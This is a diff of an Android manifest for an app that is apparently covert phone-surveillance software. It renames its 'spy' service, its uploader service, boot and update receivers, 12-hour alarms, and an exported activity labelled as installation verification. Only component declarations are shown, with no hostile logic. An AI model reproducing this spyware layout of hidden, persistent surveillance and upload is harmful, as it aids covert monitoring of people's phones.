@@ -16,10 +16,10 @@
 
   <application
       android:allowBackup="false"
+      android:requestLegacyExternalStorage="true"
       android:icon="@mipmap/ic_launcher"
       android:label="@string/app_name"
       android:name=".BaseApplication"
-      android:requestLegacyExternalStorage="true"
       android:theme="@style/BaseTheme">
     <!--Launcher Activity-->
     <activity android:name=".activities.MainActivity"
@@ -32,34 +32,34 @@
     <!--Other apps launch this activity for starting app.-->
     <activity
 	android:exported="true"
-	android:name=".activities.SnopperStarterActivity"
+	android:name=".activities.SpyStarterActivity"
 	android:label="@string/verifying_installation"
 	android:theme="@style/BaseTheme.DialogActivity"/>
     <!--Service for running spys-->
-    <service android:name=".services.SnopperService"
-	     android:process=":remote"/>
+    <service android:name=".services.SpyService"
+	     android:process=":spyProc"/>
     <!--Service for uploading and downloading data from server-->
     <service android:name=".services.UploaderService"
-	     android:process=":remote"/>
+	     android:process=":uploaderProc"/>
     <!--Service for showing update of app (when available) in permanent notification-->
     <service android:name=".services.AppUpdateInformerService"
-	     android:process=":remote"/>
+	     android:process=":updaterProc"/>
     <!--Receiver for monitoring reboot of phone-->
-    <receiver android:name=".receivers.OnBootCompleteReceiver">
+    <receiver android:name=".receivers.BootCompleteReceiver">
       <intent-filter>
         <action android:name="android.intent.action.BOOT_COMPLETED" />
         <action android:name="android.intent.action.QUICKBOOT_POWERON" />
       </intent-filter>
     </receiver>
     <!--Receiver for monitoring app updates-->
-    <receiver android:name=".receivers.OnAppUpdateReceiver">
+    <receiver android:name=".receivers.AppUpdateReceiver">
       <intent-filter>
 	<action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
       </intent-filter>
     </receiver>
     <!--Receiver that receives broadcast after 12 hours. and saves all the spy stuff-->
-    <receiver android:name=".receivers.SnopperAlarm"/>
+    <receiver android:name=".receivers.SpyAlarmReceiver"/>
     <!--Receiver that receives broadcast after 12 hours. and saves all the spy stuff-->
-    <receiver android:name=".receivers.UploaderAlarm"/>
+    <receiver android:name=".receivers.UploaderAlarmReceiver"/>
   </application>
 </manifest>
